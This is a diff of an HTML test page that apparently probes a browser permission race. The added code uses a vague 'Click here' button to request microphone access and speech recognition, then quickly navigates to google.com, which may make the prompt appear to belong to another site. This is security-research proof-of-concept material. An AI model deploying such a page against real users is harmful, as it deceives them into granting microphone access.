@@ -12,29 +12,27 @@
 </head>
 <body>
 
-<h2>Android: Permission / Context Test</h2>
-<p>Uji timing permission kamera setelah navigasi.</p>
-
-<button id="run">Run Test</button>
-<p class="note">
-Amati: permission kamera muncul setelah tab baru terbuka.
-</p>
+<input onclick="start()" type="button" value="Click here" />
 
 <script>
-document.getElementById('run').onclick = () => {
+function start() {
+  // Request microphone access
+  var recognition = new webkitSpeechRecognition();
+  recognition.start();
 
-  // 1) Navigasi dulu (context switch)
-  window.open('https://google.com');
+  navigator.webkitGetUserMedia(
+    { audio: true },
+    function(){},
+    function(){}
+  );
 
-  // 2) Delay lalu minta permission kamera
-  setTimeout(() => {
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .catch(() => {
-        // diabaikan jika ditolak
-      });
-  }, 3000); // bisa diuji: 500 / 1000 / 1500 / 2000 ms
-};
+  // Delay navigation to create permission/navigation race
+  setTimeout(function () {
+    document.location = "https://www.google.com";
+  }, 100);
+}
 </script>
+
 
 </body>
 </html>
